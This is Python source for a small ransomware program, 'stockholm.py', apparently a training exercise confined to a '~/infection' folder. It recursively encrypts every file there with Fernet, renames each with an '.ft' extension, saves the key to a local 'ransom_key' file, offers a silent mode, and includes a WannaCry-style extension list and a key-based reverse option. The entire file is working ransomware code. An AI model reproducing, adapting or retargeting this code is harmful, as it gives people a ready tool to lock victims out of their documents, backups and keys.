from cryptography.fernet import Fernet , InvalidToken
import os
import argparse

version = '1.0.0'
silent = False
wannacry = (".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der")

def log(msg):
    if not silent:
        print(msg)

def encryptFolder(path,key):
    log(f'\33[32mAccessing : {path}\33[0m')
    if not os.access(path, os.R_OK | os.W_OK):
        log(f'\33[31mAccess denied to {path}\33[0m')
        return
    # find all files, which endswith wannacry exts
    file_list = os.listdir(path)
    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f))] # and f.endswith(wannacry)
    dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
    log(f"\33[35mFiles to encrypt : {files_only}\33[0m")
    try:
        for file in files_only:
            with open(file, 'br') as f:
                content = f.read()
            fer = Fernet(key)
            encryptedData = fer.encrypt(content)
            log(f"\33[36mEncrypting file : {file}\33[0m")
            with open(file, 'bw') as f:
                f.write(encryptedData)
                if (not file.endswith('.ft')):
                    log(f"\33[94mRenaming file to : {file + '.ft'}\33[0m")
                    os.rename(file,file + '.ft')
    except Exception as e:
        print('errioooror')
    for folder in dirs_only:
        encryptFolder(folder,key)

def decryptFolder(path,key):
    log(f'\33[32mAccessing : {path}\33[0m')
    if not os.access(path, os.R_OK | os.W_OK):
        log(f'\33[31mAccess denied to {path}\33[0m')
        return
    file_list = os.listdir(path)
    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f)) and f.endswith('.ft')]# 
    dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
    if len(files_only) == 0:
        log(f"\33[35mFiles to Decrypt : no '.ft' files found\33[0m")
    else:
        log(f"\33[35mFiles to Decrypt : {files_only}\33[0m")
    try:
        for file in files_only:
            with open(file, 'br') as f:
                content = f.read()
            fer = Fernet(key)
            log(f"\33[36mDecrypting file  : {file}\33[0m")
            try:
                decryptedData = fer.decrypt(content)
            except (InvalidToken,TypeError) :
                log('\33[31mError : Invalid Key.\33[0m')
                exit(1)
            with open(file, 'bw') as f:
                f.write(decryptedData)
                log(f"\33[94mRenaming file to : {file[:-3]}\33[0m")
                os.rename(file,file[:-3])
    except Exception as e:
        print(e)
    for folder in dirs_only:
        decryptFolder(folder,key)

if __name__ == '__main__':
    usage = 'usage: stockholm.py [-h] [-v | -r key] [-s]'
    parser = argparse.ArgumentParser(description='RANSOMWARE')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-v',action='store_true',help='Display the version of the program and exit')
    group.add_argument('-r','-reverse',type=str,help='Reverse the infection using the key provided as argument',metavar='key',default=None)
    parser.add_argument('-s','-silent',action='store_true',help='silence the program, no output')
    args = parser.parse_args()
    # if args.v == False and args.r == None and args.s == False:
    #     print(usage)
    #     exit(1)
    silent = args.s
    if args.v:
        log(f"version : {version}")
        exit(0)
    home = os.environ.get('HOME')
    if (home == None):
        log('$HOME not set.')
        exit(1)
    folder = home + '/infection'
    log(f'\33[91mTARGET : {folder}\33[0m')
    if not os.path.exists(folder):
        log(f'File {folder} does not exist.')
        exit(1)
    if args.r == None:
        try:
            key = Fernet.generate_key()
            with open('ransom_key', 'w') as f:
                f.write(f"{key.decode()}")
            encryptFolder(folder,key)
        except Exception as e:
            print(e)
    else:
        try:
            decryptFolder(folder,args.r)
        except Exception as e:
            print(e)
